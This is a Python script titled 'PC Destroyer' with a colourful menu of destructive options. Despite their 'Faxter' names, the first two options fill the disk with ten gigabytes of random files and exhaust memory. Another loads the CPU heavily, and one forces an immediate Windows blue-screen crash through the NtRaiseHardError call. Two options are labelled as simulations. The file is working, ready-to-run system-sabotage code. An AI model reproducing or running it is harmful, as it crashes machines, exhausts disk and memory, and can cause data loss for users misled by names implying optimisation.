import os
import time
import ctypes
import psutil
from colorama import init, Fore, Style
from termcolor import colored

init()

def slow_print(text, delay=0.03, color=None, style=None):
    for char in text:
        if style:
            print(style, end="")
        if color:
            print(colored(char, color=color), end='', flush=True)  
        else:
            print(char, end='', flush=True)
        time.sleep(delay)
    print(Style.RESET_ALL)

def print_banner():
    banner = r"""
     _______    ______         _______                         __                                                       
    |       \  /      \       |       \                       |  \                                                      
    | $$$$$$$\|  $$$$$$\      | $$$$$$$\  ______    _______  _| $$_     ______    ______   __    __   ______    ______  
    | $$__/ $$| $$   \$$      | $$  | $$ /      \  /       \|   $$ \   /      \  /      \ |  \  |  \ /      \  /      \ 
    | $$    $$| $$            | $$  | $$|  $$$$$$\|  $$$$$$$ \$$$$$$  |  $$$$$$\|  $$$$$$\| $$  | $$|  $$$$$$\|  $$$$$$\
    | $$$$$$$ | $$   __       | $$  | $$| $$    $$ \$$    \   | $$ __ | $$   \$$| $$  | $$| $$  | $$| $$    $$| $$   \$$
    | $$      | $$__/  \      | $$__/ $$| $$$$$$$$ _\$$$$$$\  | $$|  \| $$      | $$__/ $$| $$__/ $$| $$$$$$$$| $$      
    | $$       \$$    $$      | $$    $$ \$$     \|       $$   \$$  $$| $$       \$$    $$ \$$    $$ \$$     \| $$      
     \$$        \$$$$$$        \$$$$$$$   \$$$$$$$ \$$$$$$$     \$$$$  \$$        \$$$$$$  _\$$$$$$$  \$$$$$$$ \$$      
                                                                                              |  \__| $$                    
                                                                                               \$$    $$                    
                                                                                                \$$$$$$                                      
    """
    colors = ['red', 'yellow', 'green', 'cyan', 'magenta']  
    for i, line in enumerate(banner.split("\n")):
        slow_print(line, delay=0.001, color=colors[i % len(colors)])  

def print_options():

    options = [
        "1. SSD Faxter",
        "2. Ram Faxter",
        "3. GPU Destroyer",
        "4. CPU Destroyer",
        "5. Instant Blue Screen",
        "6. Fix (Optimize PC)",
        "Note: 3 and 6 is a simulation."
    ]
    print("\n" + colored("Options:", "yellow", attrs=["bold"]))
    for option in options:
        slow_print(option, delay=0.01, color="green", style=Style.BRIGHT)

def ssd_faxter():

    print(colored("SSD Faxter working...", "cyan"))
    for i in range(10):  
        with open(f"dummy_file_{i}.bin", "wb") as f:
            f.write(os.urandom(1024 * 1024 * 1024))  
    slow_print("SSD Faxter progress completed.", delay=0.02, color="cyan")

def ram_faxter():

    print(colored("Ram Faxter working...", "cyan"))
    data = []
    try:
        while True:
            data.append(os.urandom(1024 * 1024 * 100))  
    except MemoryError:
        slow_print("Ram Faxter completed.", delay=0.02, color="cyan")

def gpu_destroyer():
    print(colored("GPU Destroyer working...", "cyan"))
    slow_print("This is a simulation. If it really works, you can't even leave and press fix.", delay=0.02, color="cyan")

def cpu_destroyer():

    print(colored("CPU Destroyer working...", "cyan"))
    for _ in range(psutil.cpu_count() * 2):
        _ = [i**2 for i in range(10000000)]
    slow_print("CPU Destroyer progress completed.", delay=0.02, color="cyan")

def instant_blue_screen():
    slow_print("Forcing windows to Blue Screen of Death. Please use my code again <3", delay=0.02, color="cyan")
    ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
    ctypes.windll.ntdll.NtRaiseHardError(0xC000007B, 0, 0, 0, 6, ctypes.byref(ctypes.c_uint()))

def fix_optimize():
    slow_print("Fix (Optimize PC) working...", delay=0.02, color="cyan")
    slow_print("This is a simulation. No optimizing for you.", delay=0.02, color="cyan")

def handle_choice(choice):
    if choice == '1':
        ssd_faxter()
    elif choice == '2':
        ram_faxter()
    elif choice == '3':
        gpu_destroyer()
    elif choice == '4':
        cpu_destroyer()
    elif choice == '5':
        instant_blue_screen()
    elif choice == '6':
        fix_optimize()
    else:
        slow_print("Wrong selection.", delay=0.02, color="red")

def main():
    start_app()
    while True:
        choice = input(colored("Input the selection: ", "yellow"))
        handle_choice(choice)

def start_app():
    os.system('cls' if os.name == 'nt' else 'clear')
    print_banner()
    print_options()

if __name__ == "__main__":
    main()
